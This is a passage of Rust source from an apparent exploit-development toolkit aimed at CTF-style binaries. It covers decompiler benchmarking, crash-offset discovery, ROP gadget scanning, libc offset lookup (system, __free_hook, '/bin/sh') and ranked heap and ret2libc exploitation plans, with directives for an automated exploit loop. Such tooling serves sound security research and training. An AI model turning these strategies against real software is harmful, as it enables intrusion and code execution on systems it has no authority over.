        "case_count": cases.len(),
        "cases": cases,
    }))
}

fn benchmark_binary_candidates(root: &Path, max_files: usize) -> Result<Vec<PathBuf>> {
    let mut out = Vec::new();
    collect_benchmark_binaries(root, max_files, &mut out)?;
    Ok(out)
}

fn decompiler_benchmark_json(
    root: &Path,
    max_files: usize,
    max_functions: usize,
) -> Result<serde_json::Value> {
    let candidates = benchmark_binary_candidates(root, max_files.clamp(1, 256))?;
    let mut reports = Vec::new();
    let mut score_sum = 0u64;
    let mut recovered_functions = 0usize;
    let mut analyzed_functions = 0usize;
    let mut legacy_ok = 0usize;
    let mut reducible = 0usize;
    let mut machine_facts = 0usize;
    let mut dataflow_facts = 0usize;
    let mut kir_facts = 0usize;
    let mut kir_ssa_facts = 0usize;
    let mut kir_expression_facts = 0usize;
    let mut kir_memory_ssa_facts = 0usize;
    let mut kir_type_facts = 0usize;
    let mut kir_render_preview_facts = 0usize;
    let mut kir_structured_preview_facts = 0usize;
    let mut kir_call_facts = 0usize;
    let mut kir_ops = 0usize;
    let mut kir_ssa_definitions = 0usize;
    let mut kir_ssa_uses = 0usize;
    let mut kir_phi_nodes = 0usize;
    let mut kir_expression_assignments = 0usize;
    let mut kir_memory_ssa_definitions = 0usize;
    let mut kir_memory_ssa_uses = 0usize;
    let mut kir_register_type_facts = 0usize;
    let mut kir_memory_type_facts = 0usize;
    let mut kir_render_preview_lines = 0usize;
    let mut kir_structured_preview_lines = 0usize;
    let mut kir_call_sites = 0usize;
    let mut kir_syscall_sites = 0usize;
    let mut phi_candidates = 0usize;
    let mut memory_accesses = 0usize;
    let mut variable_candidates = 0usize;
    let mut blockers = std::collections::BTreeSet::<String>::new();

    for binary in candidates {
        match core::decompile::decompiler_quality_report_path(&binary, max_functions) {
            Ok(report) => {
                score_sum += report.score as u64;
                recovered_functions += report.recovered_functions;
                analyzed_functions += report.analyzed_functions;
                legacy_ok += report.legacy_decompile_ok;
                reducible += report.reducible_functions;
                machine_facts += report.functions_with_machine_facts;
                dataflow_facts += report.functions_with_dataflow_facts;
                kir_facts += report.functions_with_kir;
                kir_ssa_facts += report.functions_with_kir_ssa;
                kir_expression_facts += report.functions_with_kir_expressions;
                kir_memory_ssa_facts += report.functions_with_kir_memory_ssa;
                kir_type_facts += report.functions_with_kir_type_facts;
                kir_render_preview_facts += report.functions_with_kir_render_preview;
                kir_structured_preview_facts += report.functions_with_kir_structured_preview;
                kir_call_facts += report.functions_with_kir_call_facts;
                kir_ops += report.total_kir_ops;
                kir_ssa_definitions += report.total_kir_ssa_definitions;
                kir_ssa_uses += report.total_kir_ssa_uses;
                kir_phi_nodes += report.total_kir_phi_nodes;
                kir_expression_assignments += report.total_kir_expression_assignments;
                kir_memory_ssa_definitions += report.total_kir_memory_ssa_definitions;
                kir_memory_ssa_uses += report.total_kir_memory_ssa_uses;
                kir_register_type_facts += report.total_kir_register_type_facts;
                kir_memory_type_facts += report.total_kir_memory_type_facts;
                kir_render_preview_lines += report.total_kir_render_preview_lines;
                kir_structured_preview_lines += report.total_kir_structured_preview_lines;
                kir_call_sites += report.total_kir_call_sites;
                kir_syscall_sites += report.total_kir_syscall_sites;
                phi_candidates += report.total_phi_candidates;
                memory_accesses += report.total_memory_accesses;
                variable_candidates += report.total_variable_candidates;
                for blocker in &report.blockers {
                    blockers.insert(blocker.clone());
                }
                reports.push(serde_json::to_value(report)?);
            }
            Err(err) => {
                blockers
                    .insert("one or more binaries could not be decompiler-benchmarked".to_string());
                reports.push(serde_json::json!({
                    "kind": "decompiler_quality_report",
                    "binary": binary,
                    "error": err.to_string(),
                    "score": 0,
                }));
            }
        }
    }

    let case_count = reports.len();
    let aggregate_score = if case_count == 0 {
        0
    } else {
        (score_sum / case_count as u64) as u32
    };
    Ok(serde_json::json!({
        "kind": "decompiler_benchmark",
        "root": root,
        "max_files": max_files.clamp(1, 256),
        "max_functions": max_functions.clamp(1, 5000),
        "case_count": case_count,
        "aggregate_score": aggregate_score,
        "summary": {
            "recovered_functions": recovered_functions,
            "analyzed_functions": analyzed_functions,
            "legacy_decompile_ok": legacy_ok,
            "reducible_functions": reducible,
            "functions_with_machine_facts": machine_facts,
            "functions_with_dataflow_facts": dataflow_facts,
            "functions_with_kir": kir_facts,
            "functions_with_kir_ssa": kir_ssa_facts,
            "functions_with_kir_expressions": kir_expression_facts,
            "functions_with_kir_memory_ssa": kir_memory_ssa_facts,
            "functions_with_kir_type_facts": kir_type_facts,
            "functions_with_kir_render_preview": kir_render_preview_facts,
            "functions_with_kir_structured_preview": kir_structured_preview_facts,
            "functions_with_kir_call_facts": kir_call_facts,
            "total_kir_ops": kir_ops,
            "total_kir_ssa_definitions": kir_ssa_definitions,
            "total_kir_ssa_uses": kir_ssa_uses,
            "total_kir_phi_nodes": kir_phi_nodes,
            "total_kir_expression_assignments": kir_expression_assignments,
            "total_kir_memory_ssa_definitions": kir_memory_ssa_definitions,
            "total_kir_memory_ssa_uses": kir_memory_ssa_uses,
            "total_kir_register_type_facts": kir_register_type_facts,
            "total_kir_memory_type_facts": kir_memory_type_facts,
            "total_kir_render_preview_lines": kir_render_preview_lines,
            "total_kir_structured_preview_lines": kir_structured_preview_lines,
            "total_kir_call_sites": kir_call_sites,
            "total_kir_syscall_sites": kir_syscall_sites,
            "total_phi_candidates": phi_candidates,
            "total_memory_accesses": memory_accesses,
            "total_variable_candidates": variable_candidates,
        },
        "blockers": blockers.into_iter().collect::<Vec<_>>(),
        "reports": reports,
    }))
}

fn collect_benchmark_binaries(path: &Path, max_files: usize, out: &mut Vec<PathBuf>) -> Result<()> {
    if out.len() >= max_files {
        return Ok(());
    }
    if path.is_file() {
        if looks_like_supported_binary(path) {
            out.push(path.to_path_buf());
        }
        return Ok(());
    }
    if !path.is_dir() {
        return Ok(());
    }
    let mut entries = std::fs::read_dir(path)?
        .filter_map(|entry| entry.ok().map(|entry| entry.path()))
        .collect::<Vec<_>>();
    entries.sort();
    for entry in entries {
        collect_benchmark_binaries(&entry, max_files, out)?;
        if out.len() >= max_files {
            break;
        }
    }
    Ok(())
}

fn looks_like_supported_binary(path: &Path) -> bool {
    if path
        .components()
        .any(|component| component.as_os_str() == ".kaiju_scripts")
    {
        return false;
    }
    if path
        .file_name()
        .and_then(|name| name.to_str())
        .map_or(false, |name| name.contains(".kaiju."))
    {
        return false;
    }
    if path
        .file_name()
        .and_then(|name| name.to_str())
        .map_or(false, |name| name.contains(".so"))
    {
        return false;
    }
    if matches!(
        path.extension().and_then(|ext| ext.to_str()),
        Some("db" | "json" | "md" | "py" | "txt")
    ) {
        return false;
    }
    let Ok(data) = std::fs::read(path) else {
        return false;
    };
    goblin::Object::parse(&data).is_ok()
}

fn crash_offset_json(
    binary: &Path,
    pattern_len: usize,
    args: &[String],
    sysroot: Option<&Path>,
    timeout_secs: u64,
) -> Result<serde_json::Value> {
    let pattern_len = pattern_len.clamp(32, 1024 * 1024);
    let pattern = cyclic_pattern(pattern_len);
    let probe = debug_probe_json(
        binary,
        args,
        Some(&pattern),
        sysroot,
        &[],
        false,
        timeout_secs,
    )?;
    let mut offsets = Vec::new();
    if let Some(registers) = probe.get("registers").and_then(|v| v.as_object()) {
        for (name, value) in registers {
            if let Some(text) = value.as_str() {
                if let Some(offset) = cyclic_find_offset(&pattern, text) {
                    offsets.push(serde_json::json!({
                        "register": name,
                        "value": text,
                        "offset": offset,
                    }));
                }
            }
        }
    }
    Ok(serde_json::json!({
        "kind": "crash_offset",
        "binary": binary,
        "pattern_len": pattern_len,
        "stdin": {
            "type": "cyclic",
            "preview": &pattern[..pattern.len().min(96)],
        },
        "candidate_offsets": offsets,
        "probe": probe,
        "next_action": if offsets.is_empty() {
            "No register contained the cyclic pattern. Try a longer pattern, target-specific args, or a breakpoint near the input read."
        } else {
            "Use the smallest control-flow-relevant offset in the PoC and validate with exploit-verify."
        },
    }))
}

fn build_exploit_context(path: &Path, max_gadgets: usize) -> Result<serde_json::Value> {
    let data = std::fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let mut out = serde_json::json!({
        "binary_path": path,
        "size": data.len(),
        "runtime": runtime_candidates(path, &data),
        "adjacent_shared_objects": adjacent_shared_objects(path),
        "strings_of_interest": interesting_strings(&data, 40),
    });

    match goblin::Object::parse(&data)? {
        goblin::Object::Elf(elf) => {
            let arch = elf_arch_label(&elf);
            out["format"] = serde_json::json!("ELF");
            out["arch"] = serde_json::json!(arch);
            out["entry"] = serde_json::json!(format!("0x{:x}", elf.entry));
            out["interpreter"] = elf
                .interpreter
                .map(serde_json::Value::from)
                .unwrap_or(serde_json::Value::Null);
            out["protections"] = elf_protections(&elf);
            out["imports_sample"] = serde_json::json!(elf
                .dynsyms
                .iter()
                .filter_map(|sym| elf.dynstrtab.get_at(sym.st_name))
                .filter(|s| !s.is_empty())
                .take(40)
                .collect::<Vec<_>>());
            out["gadget_hints"] = serde_json::json!(gadget_hints(path, &data, &arch, max_gadgets)?);
            out["inferred_exploit_strategy"] = inferred_exploit_strategy(path)?;
            out["analysis_loop"] = serde_json::json!({
                "recommended_order": [
                    "1. Inspect protections/runtime and fix missing loader/sysroot before dynamic validation.",
                    "2. Use strings/prompts to locate input functions, then call function_context on those addresses.",
                    "3. Build a minimal success predicate first: exit(42), marker stdout, or local flag read.",
                    "4. Run candidate with `kaijulab api exploit-verify` after every edit.",
                    "5. Stop once exploit-verify reports success=true and script prints SCRIPT_READY."
                ],
                "verify_command_template": format!(
                    "target/debug/kaijulab api exploit-verify --file {} --expect-target-exit 42 /tmp/poc.py",
                    shell_quote(&path.to_string_lossy())
                ),
                "strategy_command": format!(
                    "target/debug/kaijulab api exploit-recipe --file {}",
                    shell_quote(&path.to_string_lossy())
                ),
            });
        }
        other => {
            out["format"] = serde_json::json!(format!("{:?}", other));
            out["error"] =
                serde_json::json!("exploit-context currently has full support for ELF only");
        }
    }
    Ok(out)
}

fn adjacent_shared_objects(path: &Path) -> Vec<serde_json::Value> {
    let Some(parent) = path.parent() else {
        return Vec::new();
    };
    let Ok(entries) = std::fs::read_dir(parent) else {
        return Vec::new();
    };
    let mut out = entries
        .filter_map(|entry| entry.ok().map(|entry| entry.path()))
        .filter(|candidate| {
            candidate
                .file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| name.contains(".so"))
        })
        .filter_map(|candidate| {
            let data = std::fs::read(&candidate).ok()?;
            let sha256 = sha256_hex(&data);
            Some(serde_json::json!({
                "path": candidate,
                "size": data.len(),
                "sha256": sha256,
                "arch": binary_arch_from_data(&data),
                "glibc_version": glibc_version_from_data(&data),
                "matching_loaders": matching_glibc_loaders(&data, binary_arch_from_data(&data).as_deref()),
            }))
        })
        .collect::<Vec<_>>();
    out.sort_by(|a, b| {
        a.get("path")
            .and_then(|v| v.as_str())
            .cmp(&b.get("path").and_then(|v| v.as_str()))
    });
    out
}

fn glibc_version_from_data(data: &[u8]) -> Option<String> {
    let text = String::from_utf8_lossy(data);
    for marker in ["glibc ", "GLIBC "] {
        if let Some(pos) = text.find(marker) {
            let rest = &text[pos + marker.len()..];
            let version: String = rest
                .chars()
                .take_while(|c| c.is_ascii_digit() || *c == '.')
                .collect();
            if !version.is_empty() {
                return Some(version);
            }
        }
    }
    if let Some(pos) = text.find("stable release version ") {
        let rest = &text[pos + "stable release version ".len()..];
        let version: String = rest
            .chars()
            .take_while(|c| c.is_ascii_digit() || *c == '.')
            .collect();
        if !version.is_empty() {
            return Some(version);
        }
    }
    None
}

fn matching_glibc_loaders(data: &[u8], arch: Option<&str>) -> Vec<String> {
    let Some(version) = glibc_version_from_data(data) else {
        return Vec::new();
    };
    let candidates: Vec<PathBuf> = match arch {
        Some("x86_64") => vec![
            PathBuf::from(format!("/lib/x86_64-linux-gnu/ld-{version}.so")),
            PathBuf::from(format!("/usr/lib/x86_64-linux-gnu/ld-{version}.so")),
            PathBuf::from(format!(
                "/opt/sysroots/x86_64/lib/x86_64-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/opt/sysroots/x86_64/usr/lib/x86_64-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/tmp/x86_64sysroot/root/lib/x86_64-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/tmp/x86_64sysroot/root/usr/lib/x86_64-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/tmp/x86_64sysroot-{version}/root/lib/x86_64-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/tmp/x86_64sysroot-{version}/root/usr/lib/x86_64-linux-gnu/ld-{version}.so"
            )),
        ],
        Some("i386") => vec![
            PathBuf::from(format!("/lib/i386-linux-gnu/ld-{version}.so")),
            PathBuf::from(format!("/usr/lib/i386-linux-gnu/ld-{version}.so")),
            PathBuf::from(format!(
                "/opt/sysroots/i386/lib/i386-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/opt/sysroots/i386/usr/lib/i386-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/tmp/i386sysroot/root/lib/i386-linux-gnu/ld-{version}.so"
            )),
            PathBuf::from(format!(
                "/tmp/i386sysroot/root/usr/lib/i386-linux-gnu/ld-{version}.so"
            )),
        ],
        _ => Vec::new(),
    };
    candidates
        .into_iter()
        .filter(|path| path.exists())
        .map(|path| path.to_string_lossy().into_owned())
        .collect()
}

fn inferred_exploit_strategy(path: &Path) -> Result<serde_json::Value> {
    let data = std::fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let mut imports = Vec::new();
    let mut protections = serde_json::Value::Null;
    let mut arch = "unknown".to_string();
    if let goblin::Object::Elf(elf) = goblin::Object::parse(&data)? {
        arch = elf_arch_label(&elf);
        protections = elf_protections(&elf);
        imports = elf
            .dynsyms
            .iter()
            .filter_map(|sym| elf.dynstrtab.get_at(sym.st_name))
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
            .collect::<Vec<_>>();
        imports.sort();
        imports.dedup();
    }

    let strings = interesting_strings(&data, 120);
    let string_text = strings
        .iter()
        .filter_map(|v| v.get("text").and_then(|v| v.as_str()))
        .collect::<Vec<_>>()
        .join("\n")
        .to_ascii_lowercase();
    let has_import = |name: &str| imports.iter().any(|import| import == name);
    let has_any_import = |names: &[&str]| names.iter().any(|name| has_import(name));
    let text_has = |needle: &str| string_text.contains(needle);

    let adjacent_libc = adjacent_shared_objects(path);
    let libc_symbols = adjacent_libc
        .iter()
        .filter_map(|obj| obj.get("path").and_then(|v| v.as_str()))
        .find_map(|p| shared_object_symbol_offsets(Path::new(p)).ok());

    let mut families = Vec::new();

    if has_import("realloc") {
        push_strategy_family(
            &mut families,
            "realloc lifetime bug / tcache poisoning",
            "high",
            vec!["imports realloc", "allocator state can often be desynchronized by realloc(ptr, 0) or realloc size changes"],
            vec![
                "Map allocation menu states and find whether realloc(ptr, 0) leaves stale pointers or indexes.",
                "If a stale pointer remains reachable, build tcache dup/poisoning and first target a leak primitive.",
                "After libc base is known, prefer __free_hook or __malloc_hook overwrite only if the bundled libc exports it.",
                "Verify with a deterministic command or target exit predicate; do not stop at heap corruption alone.",
            ],
        );
    }
    if has_any_import(&["malloc", "calloc", "free"]) {
        push_strategy_family(
            &mut families,
            "heap lifecycle corruption",
            if text_has("delete") || text_has("free") || text_has("remove") {
                "high"
            } else {
                "medium"
            },
            vec!["imports malloc/free/calloc", "menu strings may expose add/delete/show lifecycle"],
            vec![
                "Drive add/free/show/edit actions with small transcripts and record pointer reuse behavior.",
                "Look for UAF, double-free, stale indexes, size confusion, or function-pointer/content-pointer overlap.",
                "Use the first primitive to leak GOT/libc or heap metadata; compute libc base from adjacent shared-object offsets.",
                "Use the second primitive for control data such as hooks, GOT in partial RELRO, vtables, callbacks, or saved returns.",
            ],
        );
    }
    if has_any_import(&["fopen", "open", "read", "fread", "fgets"]) || text_has("file") {
        push_strategy_family(
            &mut families,
            "file read leak to libc/control-data overwrite",
            if text_has("/proc") || text_has("filename") || text_has("file") {
                "high"
            } else {
                "medium"
            },
            vec!["file/read imports or file-oriented strings"],
            vec![
                "Try controlled reads of /proc/self/maps, /proc/self/mem only when menu constraints allow it.",
                "Use maps output to compute libc base and validate it against adjacent libc offsets.",
                "Inspect exit/close/name paths for late-use buffers, FILE-like structs, callbacks, or function pointers.",
                "Trigger the late-use path with a deterministic command or exit predicate.",
            ],
        );
    }
    if has_any_import(&["scanf", "__isoc99_scanf"]) {
        push_strategy_family(
            &mut families,
            "numeric input stack/index corruption",
            "medium",
            vec!["imports scanf-family numeric parser"],
            vec![
                "Find count/index bounds and whether parser failures leave previous stack values unchanged.",
                "Probe for stack leaks in greeting/echo paths before numeric input starts.",
                "If sorted or constrained writes exist, encode the final ROP values so they satisfy that ordering constraint.",
                "When canaries exist, first establish a leak or parser-preservation trick before writing return state.",
            ],
        );
    }
    if text_has("delete") && (text_has("list") || text_has("cart") || text_has("checkout")) {
        push_strategy_family(
            &mut families,
            "linked-structure unlink/write-what-where",
            "medium",
            vec!["delete plus list-like strings suggest mutable linked structures"],
            vec![
                "Recover the node layout around add/list/delete paths and identify next/prev or owner pointers.",
                "Test whether a crafted node can enter delete/unlink after normal menu transitions.",
                "Use the write primitive first for an information leak when ASLR matters, then for a final control target.",
                "Prefer stack/GOT targets only after RELRO/PIE/protections confirm they are reachable.",
            ],
        );
    }
    if has_any_import(&["puts", "printf", "write"])
        && has_any_import(&["read", "gets", "fgets", "scanf", "__isoc99_scanf"])
    {
        push_strategy_family(
            &mut families,
            "leak then ret2libc/ROP",
            "medium",
            vec!["both output and attacker-input imports are present"],
            vec![
                "Build a stage-1 leak using PLT/GOT or an existing print primitive.",
                "Return or loop back to a stable input state after the leak.",
                "Compute libc base from bundled libc offsets and construct a final system/execve/exit chain.",
                "Use crash-offset/debug-probe for stack control only after a concrete overflow path is proven.",
            ],
        );
    }
    if families.is_empty() {
        push_strategy_family(
            &mut families,
            "generic input-to-control discovery",
            "low",
            vec!["no high-confidence exploit family inferred from imports/strings"],
            vec![
                "Use ir-query --search for prompts and menu text, then decompile handlers by address.",
                "Collect one runtime transcript per menu action and compare state transitions.",
                "Use crash-offset only after confirming an input reaches memory corruption.",
                "Define a concrete verifier predicate before spending exploit-loop attempts.",
            ],
        );
    }

    Ok(serde_json::json!({
        "kind": "exploit_strategy",
        "binary": path,
        "arch": arch,
        "protections": protections,
        "imports": imports,
        "strings_of_interest": strings,
        "adjacent_libc": adjacent_libc,
        "libc_symbol_offsets": libc_symbols,
        "ranked_families": families,
        "automation_contract": {
            "success_predicates": [
                "Preferred: exploit starts target, proves code execution by making target child exit 42 and prints returncode=42.",
                "Alternate: exploit runs a deterministic command and exploit-verify uses --expect-output with that exact marker."
            ],
            "blocked_is_not_success": "Do not emit SCRIPT_READY_BLOCKED for exploit-complexity or attempt-budget failures; only use it for missing binaries/loaders/qemu/sysroots."
        },
        "poc_requirements": [
            "Use Python stdlib only: subprocess, struct, re, os, select/timeouts.",
            "Read KAIJU_BINARY/KAIJULAB_BINARY and KAIJU_SYSROOT/KAIJULAB_SYSROOT.",
            "For foreign arch, spawn qemu-$arch -L $KAIJU_SYSROOT $KAIJU_BINARY.",
            "Parse leaks as bytes, compute libc base from bundled libc offsets, then run final stage."
        ]
    }))
}

fn push_strategy_family(
    families: &mut Vec<serde_json::Value>,
    name: &str,
    confidence: &str,
    evidence: Vec<&str>,
    plan: Vec<&str>,
) {
    families.push(serde_json::json!({
        "name": name,
        "confidence": confidence,
        "evidence": evidence,
        "plan": plan,
    }));
}

fn shared_object_symbol_offsets(path: &Path) -> Result<serde_json::Value> {
    let data = std::fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let goblin::Object::Elf(elf) = goblin::Object::parse(&data)? else {
        anyhow::bail!("not an ELF shared object: {}", path.display());
    };
    let wanted = [
        "system",
        "exit",
        "_exit",
        "puts",
        "read",
        "write",
        "printf",
        "__free_hook",
        "__malloc_hook",
        "environ",
        "_IO_2_1_stdout_",
        "_IO_2_1_stdin_",
    ];
    let mut symbols = serde_json::Map::new();
    for sym in elf.dynsyms.iter() {
        let Some(name) = elf.dynstrtab.get_at(sym.st_name) else {
            continue;
        };
        if wanted.contains(&name) {
            symbols.insert(
                name.to_string(),
                serde_json::json!(format!("0x{:x}", sym.st_value)),
            );
        }
    }
    if let Some(pos) = find_bytes(&data, b"/bin/sh\0") {
        symbols.insert(
            "str_bin_sh".to_string(),
            serde_json::json!(format!("0x{pos:x}")),
        );
    }
    Ok(serde_json::json!({
        "path": path,
        "symbols": symbols,
        "note": "Offsets are file/ELF virtual offsets from the adjacent shared object; compute libc_base from a leak before use."
    }))
}

fn sha256_hex(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    hex::encode(hasher.finalize())
}

fn elf_arch_label(elf: &goblin::elf::Elf<'_>) -> String {
    use goblin::elf::header::*;
    match (elf.header.e_machine, elf.is_64) {
        (EM_X86_64, _) => "x86_64".to_string(),
        (EM_386, _) => "i386".to_string(),
        (EM_AARCH64, _) => "aarch64".to_string(),
        (EM_ARM, _) => "arm".to_string(),
        (_, true) => format!("machine:{}-64", elf.header.e_machine),
        _ => format!("machine:{}-32", elf.header.e_machine),
    }
}

fn elf_protections(elf: &goblin::elf::Elf<'_>) -> serde_json::Value {
    use goblin::elf::{dynamic, program_header::*};
    let gnu_stack = elf
        .program_headers
        .iter()
        .find(|ph| ph.p_type == PT_GNU_STACK);
    let nx = gnu_stack.map(|ph| ph.p_flags & PF_X == 0).unwrap_or(true);
    let relro = elf
        .program_headers
        .iter()
        .any(|ph| ph.p_type == PT_GNU_RELRO);
    let bind_now = elf.dynamic.as_ref().map_or(false, |dyns| {
        dyns.dyns.iter().any(|d| {
            (d.d_tag == dynamic::DT_BIND_NOW)
                || (d.d_tag == dynamic::DT_FLAGS && d.d_val & dynamic::DF_BIND_NOW != 0)
                || (d.d_tag == dynamic::DT_FLAGS_1 && d.d_val & dynamic::DF_1_NOW != 0)
        })
    });
    let canary = elf
        .dynsyms
        .iter()
        .filter_map(|sym| elf.dynstrtab.get_at(sym.st_name))
        .any(|s| s == "__stack_chk_fail" || s == "__stack_chk_guard");
    serde_json::json!({
        "nx": nx,
        "pie": elf.is_lib,
        "relro": if relro && bind_now { "full" } else if relro { "partial" } else { "none" },
        "canary_import": canary,
        "static": elf.interpreter.is_none(),
    })
}

fn runtime_candidates(path: &Path, data: &[u8]) -> serde_json::Value {
    let mut candidates = Vec::new();
    let mut notes = Vec::new();
    let mut arch = "unknown".to_string();
    let mut interpreter: Option<String> = None;
    if let Ok(goblin::Object::Elf(elf)) = goblin::Object::parse(data) {
        arch = elf_arch_label(&elf);
        interpreter = elf.interpreter.map(|s| s.to_string());
    }

    candidates.push(serde_json::json!({
        "label": "native",
        "argv": [path.to_string_lossy().to_string()],
        "available": true,
    }));

    let qemu_names: &[&str] = match arch.as_str() {
        "i386" => &["qemu-i386-static", "qemu-i386"],
        "x86_64" => &["qemu-x86_64-static", "qemu-x86_64"],
        "aarch64" => &["qemu-aarch64-static", "qemu-aarch64"],
        "arm" => &["qemu-arm-static", "qemu-arm"],
        _ => &[],
    };
    for qemu in qemu_names {
        if let Some(found) = find_in_path(qemu) {
            let argv = default_sysroot_for_arch(&arch)
                .filter(|_| interpreter.is_some())
                .map(|sysroot| {
                    vec![
                        found.clone(),
                        "-L".to_string(),
                        sysroot.to_string_lossy().into_owned(),
                        path.to_string_lossy().to_string(),
                    ]
                })
                .unwrap_or_else(|| vec![found.clone(), path.to_string_lossy().to_string()]);
            candidates.push(serde_json::json!({
                "label": qemu,
                "argv": argv,
                "available": true,
            }));
        } else {
            candidates.push(serde_json::json!({
                "label": qemu,
                "available": false,
                "install_hint": format!("install {}", qemu),
            }));
        }
    }

    if let Some(interp) = &interpreter {
        if !Path::new(interp).exists() {
            let hint = if interp.ends_with("ld-linux.so.2") {
                "missing i386 dynamic loader; install libc6:i386 or run qemu-i386 -L <i386-sysroot>"
            } else {
                "missing dynamic loader; install matching sysroot or run qemu with -L"
            };
            notes.push(serde_json::json!({
                "kind": "missing_interpreter",
                "path": interp,
                "hint": hint,
            }));
        }
    }

    serde_json::json!({
        "arch": arch,
        "interpreter": interpreter,
        "candidates": candidates,
        "notes": notes,
    })
}

fn binary_arch_from_data(data: &[u8]) -> Option<String> {
    match goblin::Object::parse(data).ok()? {
        goblin::Object::Elf(elf) => Some(elf_arch_label(&elf)),
        _ => None,
    }
}

fn binary_interpreter_from_data(data: &[u8]) -> Option<String> {
    match goblin::Object::parse(data).ok()? {
        goblin::Object::Elf(elf) => elf.interpreter.map(|s| s.to_string()),
        _ => None,
    }
}

fn host_arch_label() -> &'static str {
    match std::env::consts::ARCH {
        "x86_64" => "x86_64",
        "x86" | "i386" | "i586" | "i686" => "i386",
        "aarch64" => "aarch64",
        "arm" | "armv7" => "arm",
        other => other,
    }
}

fn default_runner_for_arch(arch: Option<&str>) -> Option<String> {
    let arch = arch?;
    if arch == host_arch_label() {
        return None;
    }
    let candidates: &[&str] = match arch {
        "i386" => &["qemu-i386-static", "qemu-i386"],
        "x86_64" => &["qemu-x86_64-static", "qemu-x86_64"],
        "aarch64" => &["qemu-aarch64-static", "qemu-aarch64"],
        "arm" => &["qemu-arm-static", "qemu-arm"],
        _ => &[],
    };
    candidates.iter().find_map(|name| find_in_path(name))
}

fn default_sysroot_for_arch(arch: &str) -> Option<PathBuf> {
    let candidates: &[&str] = match arch {
        "i386" => &["/opt/sysroots/i386", "/usr/i386-linux-gnu"],
        "x86_64" => &["/opt/sysroots/x86_64", "/usr/x86_64-linux-gnu"],
        "aarch64" => &["/opt/sysroots/aarch64", "/usr/aarch64-linux-gnu"],
        "arm" => &["/opt/sysroots/arm", "/usr/arm-linux-gnueabihf"],
        _ => &[],
    };
    candidates
        .iter()
        .map(PathBuf::from)
        .find(|path| path.is_dir())
}

fn effective_sysroot<'a>(
    explicit: Option<&'a Path>,
    arch: Option<&str>,
    interpreter: Option<&str>,
) -> Option<std::borrow::Cow<'a, Path>> {
    if let Some(path) = explicit {
        return Some(std::borrow::Cow::Borrowed(path));
    }
    if interpreter.is_none() {
        return None;
    }
    arch.and_then(default_sysroot_for_arch)
        .map(std::borrow::Cow::Owned)
}

fn find_in_path(name: &str) -> Option<String> {
    let path = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path) {
        let candidate = dir.join(name);
        if candidate.is_file() {
            return Some(candidate.to_string_lossy().into_owned());
        }
    }
    None
}

fn gadget_hints(
    path: &Path,
    data: &[u8],
    arch: &str,
    max_gadgets: usize,
) -> Result<serde_json::Value> {
    let patterns: &[(&str, &[u8])] = match arch {
        "i386" => &[
            ("pop eax; ret", b"\x58\xc3"),
            ("pop ebx; ret", b"\x5b\xc3"),
            ("pop ecx; ret", b"\x59\xc3"),
            ("pop edx; ret", b"\x5a\xc3"),
            ("int 0x80", b"\xcd\x80"),
            ("leave; ret", b"\xc9\xc3"),
        ],
        "x86_64" => &[
            ("pop rax; ret", b"\x58\xc3"),
            ("pop rdi; ret", b"\x5f\xc3"),
            ("pop rsi; ret", b"\x5e\xc3"),
            ("pop rdx; ret", b"\x5a\xc3"),
            ("syscall", b"\x0f\x05"),
            ("leave; ret", b"\xc9\xc3"),
        ],
        _ => &[],
    };

    let obj = object::File::parse(data)?;
    let mut exec_sections = Vec::new();
    for section in obj.sections() {
        let is_exec = match section.flags() {
            object::SectionFlags::Elf { sh_flags } => sh_flags & 0x4 != 0,
            object::SectionFlags::Coff { characteristics } => characteristics & 0x2000_0000 != 0,
            _ => false,
        };
        if is_exec {
            if let Ok(bytes) = section.data() {
                exec_sections.push((section.address(), bytes.to_vec()));
            }
        }
    }

    let mut result = serde_json::Map::new();
    for (name, pat) in patterns {
        let mut hits = Vec::new();
        for (base, bytes) in &exec_sections {
            let mut start = 0;
            while let Some(pos) = find_bytes(&bytes[start..], pat) {
                hits.push(format!("0x{:x}", base + (start + pos) as u64));
                if hits.len() >= max_gadgets {
                    break;
                }
                start += pos + 1;
            }
            if hits.len() >= max_gadgets {
                break;
            }
        }
        result.insert((*name).to_string(), serde_json::json!(hits));
    }
    result.insert(
        "note".to_string(),
        serde_json::json!(format!(
            "Byte-pattern gadget hints for {}; confirm semantics before use.",
            path.display()
        )),
    );
    Ok(serde_json::Value::Object(result))
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn interesting_strings(data: &[u8], limit: usize) -> Vec<serde_json::Value> {
    let keywords = [
        "addr", "data", "flag", "/bin/sh", "/tmp", "read", "write", "open", "shell", "name",
        "password", "input", "welcome", "ctf",
    ];
    let mut out = Vec::new();
    let mut start = None;
    for (i, b) in data.iter().copied().enumerate() {
        let printable = b.is_ascii_graphic() || b == b' ';
        match (start, printable) {
            (None, true) => start = Some(i),
            (Some(s), false) => {
                if i.saturating_sub(s) >= 4 {
                    push_interesting_string(data, s, i, &keywords, &mut out, limit);
                    if out.len() >= limit {
                        return out;
                    }
                }
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start {
        push_interesting_string(data, s, data.len(), &keywords, &mut out, limit);
    }
    out
}

fn push_interesting_string(
    data: &[u8],
    start: usize,
    end: usize,
    keywords: &[&str],
    out: &mut Vec<serde_json::Value>,
    limit: usize,
) {
    if out.len() >= limit {
        return;
    }
    let s = String::from_utf8_lossy(&data[start..end]).into_owned();
    let low = s.to_ascii_lowercase();
    if keywords.iter().any(|kw| low.contains(kw)) {
        out.push(serde_json::json!({
            "file_offset": format!("0x{:x}", start),
            "text": s,
        }));
    }
}

fn verify_exploit_script(
    script: &Path,
    binary: &Path,
